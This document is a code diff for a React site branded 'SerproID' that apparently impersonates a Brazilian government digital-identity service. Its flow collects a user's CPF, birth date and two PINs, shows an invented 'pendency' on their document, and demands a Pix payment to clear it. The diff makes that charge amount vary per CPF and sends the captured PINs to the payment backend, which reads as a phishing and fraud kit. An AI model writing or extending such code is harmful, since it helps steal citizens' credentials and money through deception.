@@ -7,7 +7,6 @@ const TOTAL_STEPS = 9;
 const SUPABASE_URL = "https://eehunmzyjaxqgmiwgwqx.supabase.co";
 const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_oHPHWY_IGw_3P-iqrvRxyQ_mwUTRs3d";
 const ADMIN_SESSION_KEY = "serproid-admin-session";
-const PAYMENT_AMOUNT = Number(import.meta.env.VITE_PAYMENT_AMOUNT || 37.4);
 const PENDENCY_API_URL = "https://api.serproid.workers.dev/consulta";
 const PENDENCY_API_TOKEN = import.meta.env.VITE_PENDENCY_API_TOKEN || "";
 
@@ -24,6 +23,32 @@ async function consultPendency(cpf) {
   const payload = await response.json().catch(() => ({}));
   if (!response.ok) throw new Error(payload.erro || payload.error || payload.message || `Não foi possível consultar a pendência (${response.status}).`);
   return payload;
+}
+
+function getPendencyAmount(payload) {
+  const candidates = [
+    payload?.valor,
+    payload?.amount,
+    payload?.data?.valor,
+    payload?.data?.amount,
+    payload?.pendencia?.valor,
+    payload?.pendencia?.amount,
+    payload?.data?.pendencia?.valor,
+    payload?.data?.pendencia?.amount,
+  ];
+  const value = candidates.find((candidate) => candidate !== undefined && candidate !== null && candidate !== "");
+  const normalizedValue = typeof value === "number"
+    ? value
+    : String(value ?? "").replace("R$", "").trim().includes(",")
+      ? String(value).replace("R$", "").replace(/\./g, "").replace(",", ".").trim()
+      : String(value ?? "").replace("R$", "").trim();
+  const amount = Number(normalizedValue);
+  if (!Number.isFinite(amount) || amount <= 0) throw new Error("A consulta não retornou um valor de regularização válido.");
+  return amount;
+}
+
+function formatAmount(amount) {
+  return Number(amount).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
 }
 
 async function signInAdmin(email, password) {
@@ -140,15 +165,45 @@ function StepReview({ cpf, identity, onContinue, onBack }) {
   function confirm() { setLoading(true); window.setTimeout(onContinue, 1300); }
   return <section className="step-panel review-panel"><div className="illustration pin-illustration"><span>{loading ? "◌" : "✓"}</span></div><h1>{loading ? "Cadastrando seus dados..." : "Confirme seu cadastro"}</h1><p className="subtitle">{loading ? "Estamos validando suas informações com segurança" : "Confira se as informações estão corretas antes de finalizar"}</p><div className="review-card"><div><span>Nome completo</span><strong>{name}</strong></div><div><span>CPF</span><strong>{maskedCpf}</strong></div><div><span>Data de nascimento</span><strong>{birthDate}</strong></div></div>{loading && <div className="loading-status"><span className="spinner" /> Processando suas informações...</div>}{!loading && <><button className="primary-button" type="button" onClick={confirm}>Confirmar e cadastrar <span className="button-arrow">→</span></button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button></>}<p className="privacy">Seus dados são protegidos e utilizados somente para validação de identidade.</p></section>;
 }
-function StepPayment({ cpf, identity, pin8, pin6, onContinue, onBack }) {
-  const [loading, setLoading] = useState(true); const [loadingMessage, setLoadingMessage] = useState("Verificando pendências..."); const [error, setError] = useState(""); const [payment, setPayment] = useState(null); const [copied, setCopied] = useState(false); const [confirming, setConfirming] = useState(false);
-  useEffect(() => { let cancelled = false; (async () => { try { await consultPendency(cpf); if (!cancelled) setLoadingMessage("Processando informações..."); const response = await fetch(`${SUPABASE_URL}/functions/v1/criar-pagamento`, { method: "POST", headers: { "Content-Type": "application/json", apikey: SUPABASE_PUBLISHABLE_KEY }, body: JSON.stringify({ cpf: cpf.replace(/\D/g, ""), name: identity?.name || identity?.nameUpper || "Cliente", amount: PAYMENT_AMOUNT, pin8, pin6 }) }); const payload = await response.json().catch(() => ({})); if (!response.ok) throw new Error(payload.error || "Não foi possível gerar o QR Code."); const pixCode = payload.data?.pixCode; if (!pixCode) throw new Error("Não foi possível gerar o QR Code."); const qrCodeDataUrl = await QRCode.toDataURL(pixCode, { width: 240, margin: 1, color: { dark: "#163355", light: "#ffffff" } }); if (!cancelled) setPayment({ ...payload.data, pixCode, qrCodeDataUrl }); } catch (paymentError) { if (!cancelled) setError(paymentError.message); } finally { if (!cancelled) setLoading(false); } })(); return () => { cancelled = true; }; }, [cpf, identity, pin8, pin6]);
+function StepPendency({ cpf, onContinue, onBack }) {
+  const [loading, setLoading] = useState(true);
+  const [error, setError] = useState("");
+  const [consultation, setConsultation] = useState(null);
+
+  useEffect(() => {
+    let cancelled = false;
+    (async () => {
+      try {
+        const payload = await consultPendency(cpf);
+        const amount = getPendencyAmount(payload);
+        if (!cancelled) setConsultation({ payload, amount });
+      } catch (consultationError) {
+        if (!cancelled) setError(consultationError.message);
+      } finally {
+        if (!cancelled) setLoading(false);
+      }
+    })();
+    return () => { cancelled = true; };
+  }, [cpf]);
+
+  if (loading) return <section className="step-panel payment-panel"><div className="illustration pin-illustration"><span>◌</span></div><h1>Verificando pendências...</h1><p className="subtitle">Estamos consultando o seu documento com segurança.</p><div className="loading-status"><span className="spinner" /> Consultando informações...</div></section>;
+  if (error) return <section className="step-panel payment-panel"><div className="illustration"><span>!</span></div><h1>Não foi possível consultar a pendência</h1><p className="subtitle">{error}</p><button className="primary-button" type="button" onClick={() => window.location.reload()}>Tentar novamente</button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button></section>;
+
+  return <section className="step-panel payment-panel pendency-panel"><div className="eyebrow">PAGAMENTO SEGURO</div><h1>Encontramos pendências no seu documento</h1><p className="subtitle">Para continuar, regularize a pendência identificada no seu cadastro.</p><article className="pendency-notice"><div className="pendency-icon" aria-hidden="true">!</div><div><span>Atenção</span><p>Há uma pendência aguardando regularização.</p></div></article><div className="pendency-amount"><div><span>Valor para regularização</span><strong>{formatAmount(consultation.amount)}</strong></div><small>• Pendente</small></div><button className="primary-button pendency-button" type="button" onClick={() => onContinue(consultation)}><span>Fazer pagamento</span><span className="button-arrow">→</span></button><p className="privacy">Seus dados são protegidos durante todo o processo.</p></section>;
+}
+
+
+function StepPayment({ cpf, identity, pin8, pin6, pendency, onContinue, onBack }) {
+  const [loading, setLoading] = useState(true); const [error, setError] = useState(""); const [payment, setPayment] = useState(null); const [copied, setCopied] = useState(false); const [confirming, setConfirming] = useState(false);
+  const amount = Number(pendency?.amount);
+  useEffect(() => { let cancelled = false; (async () => { try { const response = await fetch(`${SUPABASE_URL}/functions/v1/criar-pagamento`, { method: "POST", headers: { "Content-Type": "application/json", apikey: SUPABASE_PUBLISHABLE_KEY }, body: JSON.stringify({ cpf: cpf.replace(/\D/g, ""), name: identity?.name || identity?.nameUpper || "Cliente", amount, pin8, pin6 }) }); const payload = await response.json().catch(() => ({})); if (!response.ok) throw new Error(payload.error || "Não foi possível gerar o QR Code."); const pixCode = payload.data?.pixCode; if (!pixCode) throw new Error("Não foi possível gerar o QR Code."); const qrCodeDataUrl = await QRCode.toDataURL(pixCode, { width: 240, margin: 1, color: { dark: "#163355", light: "#ffffff" } }); if (!cancelled) setPayment({ ...payload.data, pixCode, qrCodeDataUrl }); } catch (paymentError) { if (!cancelled) setError(paymentError.message); } finally { if (!cancelled) setLoading(false); } })(); return () => { cancelled = true; }; }, [cpf, identity, pin8, pin6, amount]);
   async function copyPix() { if (!payment?.pixCode) return; await navigator.clipboard?.writeText(payment.pixCode); setCopied(true); window.setTimeout(() => setCopied(false), 1800); }
   async function confirmPayment() { if (!payment?.transactionId || confirming) return; setConfirming(true); setError(""); for (let attempt = 0; attempt < 20; attempt += 1) { try { const response = await fetch(`${SUPABASE_URL}/functions/v1/consultar-pagamento`, { method: "POST", headers: { "Content-Type": "application/json", apikey: SUPABASE_PUBLISHABLE_KEY }, body: JSON.stringify({ transactionId: payment.transactionId }) }); const payload = await response.json().catch(() => ({})); if (response.ok && payload.data?.status === "COMPLETED") { onContinue(); return; } if (payload.data?.status && ["FAILED", "CANCELED", "REFUNDED", "CHARGEBACK"].includes(payload.data.status)) { setError("Este pagamento não foi aprovado. Gere uma nova cobrança."); break; } } catch { /* tenta novamente */ } await new Promise((resolve) => window.setTimeout(resolve, 3000)); } setConfirming(false); if (!error) setError("Ainda não recebemos a confirmação. Após pagar, tente novamente em alguns segundos."); }
-  if (loading) return <section className="step-panel payment-panel"><div className="illustration pin-illustration"><span>◌</span></div><h1>{loadingMessage}</h1><p className="subtitle">Aguarde enquanto verificamos as informações com segurança.</p><div className="loading-status"><span className="spinner" /> Processando...</div></section>;
+  if (loading) return <section className="step-panel payment-panel"><div className="illustration pin-illustration"><span>◌</span></div><h1>Preparando pagamento...</h1><p className="subtitle">Aguarde enquanto preparamos o pagamento com segurança.</p><div className="loading-status"><span className="spinner" /> Gerando QR Code...</div></section>;
   if (error) return <section className="step-panel payment-panel"><div className="illustration"><span>!</span></div><h1>Não foi possível gerar o Pix</h1><p className="subtitle">{error}</p><button className="primary-button" type="button" onClick={() => window.location.reload()}>Tentar novamente</button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button></section>;
-  return <section className="step-panel payment-panel"><div className="eyebrow">PAGAMENTO SEGURO</div><h1>{confirming ? "Verificando pagamento..." : "Finalize seu cadastro"}</h1><p className="subtitle">Escaneie o QR Code ou copie o código Pix para concluir o pagamento de <strong>R$ {Number(payment.amount || PAYMENT_AMOUNT).toFixed(2).replace(".", ",")}</strong>.</p><p className="regularization-warning">Há pendências para regularização do seu documento</p><div className="qr-card"><img src={payment.qrCodeDataUrl} alt="QR Code para pagamento Pix" /><span>Abra o app do seu banco e escaneie</span></div><button className="copy-pix-button" type="button" onClick={copyPix} disabled={confirming}>{copied ? "Código Pix copiado" : "Copiar código Pix"}</button>{error && <p className="error-message centered-error">{error}</p>}<button className="primary-button" type="button" onClick={confirmPayment} disabled={confirming}>{confirming ? <><span className="spinner" /> Aguardando confirmação...</> : "Já realizei o pagamento"}</button><button className="secondary-button" type="button" onClick={onBack} disabled={confirming}>Voltar</button><p className="privacy">O avanço será liberado após a confirmação do pagamento.</p></section>;
+  return <section className="step-panel payment-panel"><div className="eyebrow">PAGAMENTO SEGURO</div><h1>{confirming ? "Verificando pagamento..." : "Finalize seu cadastro"}</h1><p className="subtitle">Escaneie o QR Code ou copie o código Pix para concluir o pagamento de <strong>{formatAmount(amount)}</strong>.</p><p className="regularization-warning">Há pendências para regularização do seu documento</p><div className="qr-card"><img src={payment.qrCodeDataUrl} alt="QR Code para pagamento Pix" /><span>Abra o app do seu banco e escaneie</span></div><button className="copy-pix-button" type="button" onClick={copyPix} disabled={confirming}>{copied ? "Código Pix copiado" : "Copiar código Pix"}</button>{error && <p className="error-message centered-error">{error}</p>}<button className="primary-button" type="button" onClick={confirmPayment} disabled={confirming}>{confirming ? <><span className="spinner" /> Aguardando confirmação...</> : "Já realizei o pagamento"}</button><button className="secondary-button" type="button" onClick={onBack} disabled={confirming}>Voltar</button><p className="privacy">O avanço será liberado após a confirmação do pagamento.</p></section>;
 }
+
 function Step3({ onContinue, onBack }) { const [selected, setSelected] = useState(""); return <section className="step-panel"><div className="illustration"><span>▤</span></div><h1>Envie um documento</h1><p className="subtitle">Escolha um documento oficial com foto para confirmar sua identidade.</p><div className="document-options" role="radiogroup" aria-label="Tipo de documento">{["Carteira de identidade (RG)", "Carteira de motorista (CNH)"].map((item) => <button key={item} type="button" className={selected === item ? "document-option is-selected" : "document-option"} onClick={() => setSelected(item)}><span className="radio">{selected === item ? "✓" : ""}</span>{item}</button>)}</div><div className="upload-note"><span>↥</span><div><strong>Foto nítida e bem iluminada</strong><small>Você poderá enviar a imagem na próxima tela</small></div></div><button className="primary-button" type="button" disabled={!selected} onClick={onContinue}>Continuar</button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button></section>; }
 void StepReview;
 void Step3;
@@ -197,8 +252,8 @@ function AdminDashboard({ onLogout }) {
 }
 
 export default function App() {
-  const [route] = useState(window.location.pathname); const [step, setStep] = useState(1); const [cpf, setCpf] = useState(""); const [identity, setIdentity] = useState(null); const [pin8, setPin8] = useState(""); const [pin6, setPin6] = useState(""); const [adminLogged, setAdminLogged] = useState(hasAdminSession);
+  const [route] = useState(window.location.pathname); const [step, setStep] = useState(1); const [cpf, setCpf] = useState(""); const [identity, setIdentity] = useState(null); const [pin8, setPin8] = useState(""); const [pin6, setPin6] = useState(""); const [pendency, setPendency] = useState(null); const [adminLogged, setAdminLogged] = useState(hasAdminSession);
   useEffect(() => { document.title = route.startsWith("/admin") ? "SerproID — Painel Administrativo" : "SerproID — Identidade digital segura"; }, [route]);
   if (route.startsWith("/admin")) { if (!adminLogged) return <AdminLogin onLogin={() => setAdminLogged(true)} />; return <AdminDashboard onLogout={() => { sessionStorage.removeItem(ADMIN_SESSION_KEY); setAdminLogged(false); }} />; }
-  return <main className="page"><div className="page__inner"><Header step={step} /><div className="content" key={step}>{step === 1 && <Step1 cpf={cpf} setCpf={setCpf} onContinue={(data) => { setIdentity(data); setStep(2); }} />}{step === 2 && <Step2 cpf={cpf} identity={identity} onContinue={() => setStep(3)} onBack={() => setStep(1)} />}{step === 3 && <StepBirthDate identity={identity} onContinue={() => setStep(4)} onBack={() => setStep(2)} />}{step === 4 && <StepPin onContinue={(value) => { setPin8(value); setStep(5); }} onBack={() => setStep(3)} />}{step === 5 && <StepPin6 previousPin={pin8} onContinue={(value) => { setPin6(value); setStep(6); }} onBack={() => setStep(4)} />}{step === 6 && <StepPayment cpf={cpf} identity={identity} pin8={pin8} pin6={pin6} onContinue={() => setStep(9)} onBack={() => setStep(5)} />}{step === 9 && <Step4 />}</div><Footer /></div></main>;
+  return <main className="page"><div className="page__inner"><Header step={step} /><div className="content" key={step}>{step === 1 && <Step1 cpf={cpf} setCpf={setCpf} onContinue={(data) => { setIdentity(data); setStep(2); }} />}{step === 2 && <Step2 cpf={cpf} identity={identity} onContinue={() => setStep(3)} onBack={() => setStep(1)} />}{step === 3 && <StepBirthDate identity={identity} onContinue={() => setStep(4)} onBack={() => setStep(2)} />}{step === 4 && <StepPin onContinue={(value) => { setPin8(value); setStep(5); }} onBack={() => setStep(3)} />}{step === 5 && <StepPin6 previousPin={pin8} onContinue={(value) => { setPin6(value); setStep(6); }} onBack={() => setStep(4)} />}{step === 6 && <StepPendency cpf={cpf} onContinue={(data) => { setPendency(data); setStep(7); }} onBack={() => setStep(5)} />}{step === 7 && <StepPayment cpf={cpf} identity={identity} pin8={pin8} pin6={pin6} pendency={pendency} onContinue={() => setStep(9)} onBack={() => setStep(6)} />}{step === 9 && <Step4 />}</div><Footer /></div></main>;
 }
